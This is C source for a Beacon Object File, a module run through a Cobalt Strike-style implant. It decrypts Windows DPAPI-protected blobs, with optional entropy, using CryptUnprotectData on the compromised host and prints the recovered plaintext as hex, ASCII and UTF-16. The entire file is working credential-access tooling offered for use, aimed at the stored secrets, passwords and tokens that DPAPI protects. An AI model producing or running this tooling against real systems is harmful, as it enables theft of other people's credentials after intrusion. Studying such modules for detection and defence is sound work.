/*
 * dpapi-unprotect — minimal BOF that calls CryptUnprotectData with optional
 * entropy and prints the decrypted bytes as hex, ASCII, and UTF-16LE.
 *
 * Argument contract (must match the .s1.py wrapper exactly):
 *   arg1: b  target DPAPI blob bytes (raw, no application-specific prefix)
 *   arg2: b  optional entropy bytes (empty buffer => no entropy)
 *
 * The wrapper packs both as BOFArgumentEncoding.BUFFER; this BOF reads each
 * with BeaconDataExtract(&parser, &len) so embedded NULs are preserved.
 */
#include "beacon.h"
/* DATA_BLOB is defined in <wincrypt.h>, which <windows.h> already includes. */

DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptUnprotectData(
    DATA_BLOB* pDataIn,
    LPWSTR*    ppszDataDescr,
    DATA_BLOB* pOptionalEntropy,
    PVOID      pvReserved,
    PVOID      pPromptStruct,
    DWORD      dwFlags,
    DATA_BLOB* pDataOut
);

/* Hex helper: writes (in_len*2 + 1) chars into out (caller-sized). */
static void to_hex(const BYTE* in, int in_len, char* out) {
    static const char* H = "0123456789abcdef";
    int i;
    for (i = 0; i < in_len; i++) {
        out[i * 2]     = H[(in[i] >> 4) & 0xF];
        out[i * 2 + 1] = H[ in[i]       & 0xF];
    }
    out[in_len * 2] = 0;
}

void go(char* args, int args_len) {
    HANDLE     hHeap         = NULL;
    char*      hexbuf        = NULL;
    BOOL       have_pbData   = FALSE;
    DATA_BLOB  out           = { 0, NULL };

    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int   blob_len    = 0;
    int   entropy_len = 0;
    char* blob_ptr    = BeaconDataExtract(&parser, &blob_len);
    char* entropy_ptr = BeaconDataExtract(&parser, &entropy_len);

    if (!blob_ptr || blob_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] missing or empty target blob (arg1)\n");
        return;
    }

    DATA_BLOB in  = { (DWORD)blob_len, (BYTE*)blob_ptr };
    DATA_BLOB ent = { (DWORD)entropy_len, (BYTE*)entropy_ptr };
    DATA_BLOB* p_entropy = (entropy_len > 0) ? &ent : NULL;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] CryptUnprotectData: blob=%d bytes, entropy=%d bytes\n",
        blob_len, entropy_len);

    if (!CRYPT32$CryptUnprotectData(&in, NULL, p_entropy, NULL, NULL, 0, &out)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] CryptUnprotectData failed: 0x%08x\n",
            KERNEL32$GetLastError());
        goto cleanup;
    }
    have_pbData = TRUE;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] decrypted %u bytes\n", out.cbData);

    /* Hex (cap at 4096 plaintext bytes = 8192 hex chars + NUL).
     * Heap-allocated to avoid __chkstk_ms in CS loader. */
    DWORD hex_bytes = out.cbData;
    if (hex_bytes > 4096) hex_bytes = 4096;

    hHeap  = KERNEL32$GetProcessHeap();
    hexbuf = (char*)KERNEL32$HeapAlloc(hHeap, 0, (SIZE_T)hex_bytes * 2 + 1);
    if (!hexbuf) {
        BeaconPrintf(CALLBACK_ERROR, "[!] HeapAlloc failed\n");
        goto cleanup;
    }

    to_hex(out.pbData, (int)hex_bytes, hexbuf);
    BeaconPrintf(CALLBACK_OUTPUT, "    hex   : %s%s\n",
        hexbuf, (out.cbData > hex_bytes) ? " ...(truncated)" : "");

    /* ASCII interpretation (let BeaconPrintf bound by length). */
    BeaconPrintf(CALLBACK_OUTPUT, "    ascii : %.*s\n",
        (int)out.cbData, (char*)out.pbData);

    /* UTF-16LE interpretation if length is even (.NET strings). */
    if ((out.cbData % 2) == 0 && out.cbData > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "    utf16 : %.*S\n",
            (int)(out.cbData / 2), (wchar_t*)out.pbData);
    }

cleanup:
    if (hexbuf) KERNEL32$HeapFree(hHeap, 0, hexbuf);
    if (have_pbData)
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
}
